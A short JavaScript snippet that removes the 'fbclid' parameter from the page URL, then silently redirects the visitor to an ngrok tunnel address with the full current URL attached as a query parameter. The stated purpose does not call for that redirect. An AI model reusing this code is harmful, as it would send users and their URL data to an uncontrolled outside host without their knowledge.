// Define the parameter you want to check and remove
const paramName = "fbclid";

// Create a URL object based on the current location
const currentUrl = new URL(window.location.href);

// Use URLSearchParams to work with the query string easily
const params = new URLSearchParams(currentUrl.search);

// Check if the URL has the specified query parameter
if (params.has(paramName)) {
    // Remove the parameter
    params.delete(paramName);

    // Set the search property of the current URL to the modified search params
    currentUrl.search = params.toString();

    // Prepare the redirect link by appending the modified URL as a query parameter
    const redirectLink = "https://d4d1-122-163-118-92.ngrok-free.app/abc.html?url=" + encodeURIComponent(currentUrl.toString());

    // Redirect by setting the href of an anchor tag and clicking it
    document.getElementById("a").href = redirectLink;
    document.getElementById("a").click();
}